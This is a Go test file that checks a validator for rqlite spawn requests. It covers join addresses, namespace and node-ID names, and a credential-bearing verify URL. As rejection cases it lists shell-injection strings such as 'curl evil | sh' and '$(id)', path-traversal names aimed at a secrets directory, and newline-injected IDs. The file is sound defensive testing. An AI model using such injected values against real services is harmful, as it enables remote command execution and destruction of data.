package namespace

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/DeBrosOfficial/network/pkg/auth"
	"go.uber.org/zap"
)

func validRQLiteSpawn() SpawnRequest {
	return SpawnRequest{
		Action:            "spawn-rqlite",
		Namespace:         "acme",
		NodeID:            "12D3KooWQmExamplePeerID",
		RQLiteHTTPAdvAddr: "10.0.0.2:10000",
		RQLiteRaftAdvAddr: "10.0.0.2:10001",
		RQLiteJoinAddrs:   []string{"10.0.0.1:10001", "10.0.0.3:10001"},
		// cluster_manager.go: "http://" + leaderHTTP
		RQLiteJoinVerifyURL: "http://10.0.0.1:10000",
	}
}

// What the cluster manager actually sends passes.
func TestSpawnRequestValidate_acceptsWhatTheClusterManagerSends(t *testing.T) {
	req := validRQLiteSpawn()
	if err := req.validate(); err != nil {
		t.Fatalf("a real spawn request was refused: %v", err)
	}
	req.RQLiteJoinAddrs = nil // the first node joins nobody, and verifies nobody
	req.RQLiteJoinVerifyURL = ""
	if err := req.validate(); err != nil {
		t.Fatalf("a spawn with no join address was refused: %v", err)
	}
	stop := SpawnRequest{Action: "stop-gateway", Namespace: "anchat-v2", NodeID: "node-1"}
	if err := stop.validate(); err != nil {
		t.Fatalf("a stop request was refused: %v", err)
	}
}

// The join addresses land in `sh -c '… ${JOIN_ARGS} …'` in the rqlite unit.
func TestSpawnRequestValidate_refusesJoinAddressesThatAreNotIPPort(t *testing.T) {
	for _, addr := range []string{
		"10.0.0.1:10001; curl evil | sh",
		"$(id):10001",
		"10.0.0.1:10001 -http-addr 0.0.0.0:1",
		"leader.example:10001",
		"10.0.0.1",
		"10.0.0.1:0",
		"10.0.0.1:70000",
		"10.0.0.1:+1",
		"",
	} {
		req := validRQLiteSpawn()
		req.RQLiteJoinAddrs = []string{"10.0.0.1:10001", addr}
		if err := req.validate(); err == nil {
			t.Errorf("join address %q was accepted", addr)
		}
	}
	for _, field := range []func(*SpawnRequest, string){
		func(r *SpawnRequest, v string) { r.RQLiteHTTPAdvAddr = v },
		func(r *SpawnRequest, v string) { r.RQLiteRaftAdvAddr = v },
	} {
		req := validRQLiteSpawn()
		field(&req, "10.0.0.2:10001 $(id)")
		if err := req.validate(); err == nil {
			t.Error("an advertise address carrying shell syntax was accepted")
		}
	}
}

// The namespace and node ID name directories — a fresh rqlite start removes
// one recursively.
func TestSpawnRequestValidate_refusesNamesThatArePaths(t *testing.T) {
	for _, ns := range []string{"../../etc", "a/b", ".", " acme", "acme\n", strings.Repeat("a", 65)} {
		req := validRQLiteSpawn()
		req.Namespace = ns
		if err := req.validate(); err == nil {
			t.Errorf("namespace %q was accepted", ns)
		}
	}
	for _, id := range []string{"..", "../x", "a/b", ".hidden", "n1\nX=1", "n 1"} {
		req := validRQLiteSpawn()
		req.NodeID = id
		if err := req.validate(); err == nil {
			t.Errorf("node_id %q was accepted", id)
		}
	}
}

// Refused at the handler, before anything is spawned: the handler here has no
// spawner at all, so reaching it would panic.
func TestSpawnHandler_refusesAnInvalidRequestBeforeSpawning(t *testing.T) {
	secretPath := filepath.Join(t.TempDir(), "cluster-secret")
	if err := os.WriteFile(secretPath, []byte(strings.Repeat("ab", 32)), 0o600); err != nil {
		t.Fatal(err)
	}
	key, err := auth.CoordinationKey(strings.Repeat("ab", 32))
	if err != nil {
		t.Fatal(err)
	}
	h := NewSpawnHandler(nil, secretPath, zap.NewNop())

	bad := validRQLiteSpawn()
	bad.Namespace = "../../../opt/orama/.orama/secrets"
	bad.RQLiteFreshStart = true
	body, _ := json.Marshal(bad)
	r := httptest.NewRequest(http.MethodPost, "/v1/internal/namespace/spawn", bytes.NewReader(body))
	r.RemoteAddr = "10.0.0.5:40000"
	if err := auth.SignCoordination(key, r, time.Now()); err != nil {
		t.Fatal(err)
	}
	w := httptest.NewRecorder()
	h.ServeHTTP(w, r)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status %d, want 400: %s", w.Code, w.Body.String())
	}
	var resp SpawnResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil || !strings.Contains(resp.Error, "namespace") {
		t.Errorf("response %+v (%v) does not say what was wrong", resp, err)
	}
}

// The spawner sends the cluster's rqlite credentials to the join verify URL:
// it may only be the node being joined, as http://<ip>:<port>.
func TestSpawnRequestValidate_joinVerifyURL(t *testing.T) {
	for _, ok := range []string{"", "http://10.0.0.1:10000", "http://10.0.0.3:10000/"} {
		req := validRQLiteSpawn()
		req.RQLiteJoinVerifyURL = ok
		if err := req.validate(); err != nil {
			t.Errorf("%q was refused: %v", ok, err)
		}
	}
	for _, bad := range []string{
		"http://10.0.0.9:10000",            // not a join target
		"https://10.0.0.1:10000",           // not what the manager sends
		"http://user:pw@10.0.0.1:10000",    // userinfo
		"http://10.0.0.1:10000/status?x=1", // path and query
		"http://10.0.0.1:10000#f",
		"http://leader.example:10000",
		"http://10.0.0.1",
		"10.0.0.1:10000",
	} {
		req := validRQLiteSpawn()
		req.RQLiteJoinVerifyURL = bad
		if err := req.validate(); err == nil {
			t.Errorf("%q was accepted", bad)
		}
	}
	req := validRQLiteSpawn()
	req.RQLiteJoinAddrs = nil
	if err := req.validate(); err == nil {
		t.Error("a verify URL with no join address was accepted")
	}
}
